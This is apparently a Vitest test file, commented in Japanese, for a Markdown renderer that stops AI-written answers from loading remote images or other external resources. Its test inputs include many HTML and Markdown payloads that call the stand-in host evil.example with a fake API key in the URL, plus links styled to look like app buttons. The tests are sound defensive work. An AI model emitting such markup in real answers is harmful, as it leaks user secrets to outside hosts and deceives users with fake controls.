// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { renderMarkdown } from './renderMarkdown.ts'
import { withoutRemoteImages } from './remoteImages.ts'

// AI の答え（remoteImages: false）では、外のものを何も読み込まない。画像は説明の文字とリンクにする（docs/question-canvas-tools-plan.md の B）

const SECRET = 'https://evil.example/p.png?d=sk-abc123'

// 外を読み込む属性を持つ要素（a の href はリンクなので、読み込まない）
function loads(html: string): string[] {
  const template = document.createElement('template')
  template.innerHTML = html
  const found: string[] = []
  for (const element of template.content.querySelectorAll('*')) {
    for (const attribute of ['src', 'srcset', 'poster', 'background', 'data', 'xlink:href']) {
      const value = element.getAttribute(attribute)
      if (value && !/^data:image\//i.test(value)) found.push(`${element.localName}[${attribute}]`)
    }
    if (element.localName !== 'a' && element.getAttribute('href')) found.push(`${element.localName}[href]`)
    if (/url\s*\(/i.test(element.getAttribute('style') ?? '')) found.push(`${element.localName}[style]`)
    if (['iframe', 'embed', 'object', 'video', 'audio', 'source', 'picture', 'link', 'image', 'use', 'track'].includes(element.localName)) found.push(element.localName)
  }
  return found
}

const RAW_HTML = [
  `<img src="${SECRET}" alt="図">`,
  `<img srcset="${SECRET} 2x">`,
  `<input type="image" src="${SECRET}">`,
  `<picture><source srcset="${SECRET}"><img src="${SECRET}"></picture>`,
  `<video src="${SECRET}" poster="${SECRET}"><track src="${SECRET}"></video>`,
  `<audio src="${SECRET}"></audio>`,
  `<iframe src="${SECRET}"></iframe>`,
  `<embed src="${SECRET}">`,
  `<object data="${SECRET}"></object>`,
  `<link rel="stylesheet" href="${SECRET}">`,
  `<svg><image href="${SECRET}"></image><use href="${SECRET}#a"></use></svg>`,
  `<span style="background:url(${SECRET})">x</span>`,
  `<table background="${SECRET}"><tr><td>x</td></tr></table>`,
  `<div class="katex"><span style="background-image:url(${SECRET})">x</span></div>`,
  `<img src="//evil.example/p.png">`,
  `<img src="/api/assets/abc.png">`,
]

describe('renderMarkdown remoteImages: false (AI の答え)', () => {
  const render = (source: string) => renderMarkdown(source, { remoteImages: false }).html

  it('Markdown の画像は読み込まず、説明の文字と、そのリンクにする', () => {
    const html = render(`前提：なし\n\n答えです。\n\n![グラフ](${SECRET})\n\n![](${SECRET} "題")`)
    expect(loads(html)).toEqual([])
    expect(html).not.toContain('<img')
    const template = document.createElement('template')
    template.innerHTML = html
    const links = [...template.content.querySelectorAll('a.md-image-link')]
    expect(links.map((link) => link.textContent)).toEqual(['画像：グラフ', '画像'])
    expect(links.map((link) => link.getAttribute('href'))).toEqual([SECRET, SECRET])
    expect(links.every((link) => link.getAttribute('rel') === 'noreferrer' && link.getAttribute('target') === '_blank')).toBe(true)
  })

  it('生の HTML の、外を読み込むもの（img・srcset・input・picture・video・audio・iframe・embed・object・link・svg・style の url()・background）を、どれも読み込まない', () => {
    for (const raw of RAW_HTML) {
      expect(loads(render(`答え\n\n${raw}\n`)), raw).toEqual([])
      expect(loads(render(`答えの文の中 ${raw} です`)), raw).toEqual([])
    }
    // 生の HTML の img も、説明の文字とリンクにする
    const html = render(`<img src="${SECRET}" alt="図">`)
    expect(html).toContain('画像：図')
    expect(html).toContain(`href="${SECRET.replaceAll('&', '&amp;')}"`)
  })

  it('data: の画像と、数式・リンク・書式は今のまま', () => {
    const data = 'data:image/png;base64,iVBORw0KGgo='
    expect(render(`![点](${data})`)).toContain(`src="${data}"`)
    const html = render('**太字**と [出典](https://example.org/a) と $x^2$')
    expect(html).toContain('<strong>太字</strong>')
    expect(html).toContain('href="https://example.org/a"')
    expect(html).toContain('class="katex"')
  })
})

describe('renderMarkdown（利用者の文書）', () => {
  it('外の画像を、今までどおり読み込む', () => {
    expect(renderMarkdown(`![a](${SECRET})`).html).toContain('<img src="https://evil.example/p.png?d=sk-abc123"')
    expect(renderMarkdown(`<img src="${SECRET}">`).html).toContain('<img src="https://evil.example/p.png?d=sk-abc123"')
    expect(renderMarkdown('![a](img/x.png)', { documentPath: 'notes/a.md' }).html).toContain('src="/api/workspace/notes/img/x.png"')
  })
})

describe('renderMarkdown remoteImages: false の class（AI の答え）', () => {
  it('生の HTML の class を落とし、アプリのボタンに見えるリンクを作らせない。marked・KaTeX・このファイルが付ける class は残す（レビューの probe-b3）', () => {
    const html = renderMarkdown(
      '答えです。\n\n<div class="answer-view-actions"><button class="answer-view-keep">x</button><a class="answer-view-keep" href="https://evil.example/?d=sk-abc123">Canvasに残す</a></div>\n\n' +
        '文の中の <a class="answer-view-keep" href="https://evil.example/?d=1" title="Canvasに残す">Canvasに残す</a> と $x^2$ と ![図](https://evil.example/p.png)\n\n```js\nconst a = 1\n```\n',
      { remoteImages: false },
    ).html
    expect(html).not.toContain('answer-view')
    const template = document.createElement('template')
    template.innerHTML = html
    const elements = [...template.content.querySelectorAll('[class]')]
    const classes = elements.flatMap((element) => [...element.classList])
    // KaTeX の中（KaTeX が付けた mord などの class）のほかは、自前の名前だけ
    const outside = elements.filter((element) => !element.parentElement?.closest('.katex')).flatMap((element) => [...element.classList])
    expect(outside.filter((name) => !/^(katex|md-|markdown-|language-)/.test(name))).toEqual([])
    expect(classes).toContain('katex')
    expect(classes).toContain('md-image-link')
    expect(classes).toContain('language-js')
  })

  it('利用者の文書では、生の HTML の class を今のまま残す', () => {
    expect(renderMarkdown('<div class="note">x</div>').html).toContain('class="note"')
  })
})

// レビューの probe-b3 の、写しに残っていた形
const COPY_INPUTS = [
  '![a][r]\n\n[r]: https://evil.example/ref',
  '![a [b]](https://evil.example/nested)',
  '![a](https://evil.example/t "x) y")',
  '<video poster="https://evil.example/v"></video>',
  '<input type="image" src="https://evil.example/i">',
  '<image src="https://evil.example/image">',
  '![a](&#104;ttps://evil.example/e)',
  '文の中の <img src="https://evil.example/inline"> です',
  '<picture><source srcset="https://evil.example/s"></picture>',
]

describe('withoutRemoteImages（AI の答えを写すとき）', () => {
  it('写したものを利用者の文書として描いても、外を読み込まない（参照形式・入れ子の角かっこ・題の中の )・文字参照の URL・生の HTML）', () => {
    for (const input of COPY_INPUTS) {
      const copied = withoutRemoteImages(input)
      expect(loads(renderMarkdown(copied).html), `${input} → ${copied}`).toEqual([])
      expect(copied, input).not.toMatch(/!\[|<(?:img|video|input|image|picture|source)\b/i)
    }
  })

  it('Markdown の画像は説明と URL の文字に、生の HTML はタグの < > を全角にしてただの文字にする', () => {
    expect(withoutRemoteImages(`答え\n\n![グラフ](${SECRET})\n\n![](<${SECRET}> "題") と <img alt="図" src='${SECRET}'>`)).toBe(
      `答え\n\n画像「グラフ」（${SECRET}）\n\n画像（${SECRET}） と ＜img alt="図" src='${SECRET}'＞`,
    )
    expect(withoutRemoteImages('![a][r]\n\n[r]: https://evil.example/ref')).toBe('画像「a」（https://evil.example/ref）\n\n[r]: https://evil.example/ref')
    expect(withoutRemoteImages('![a [b]](https://evil.example/nested)')).toBe('画像「a [b]」（https://evil.example/nested）')
    // コードの中は、そのまま
    expect(withoutRemoteImages('`![a](https://x.example/p.png)` と\n\n```\n<img src="https://x.example/q">\n```')).toBe('`![a](https://x.example/p.png)` と\n\n```\n<img src="https://x.example/q">\n```')
    expect(withoutRemoteImages('![点](data:image/png;base64,AAAA)')).toBe('画像「点」')
    // リンクと、画像でない文は今のまま
    expect(withoutRemoteImages('[出典](https://example.org/a) と a ! [b](c)')).toBe('[出典](https://example.org/a) と a ! [b](c)')
  })
})
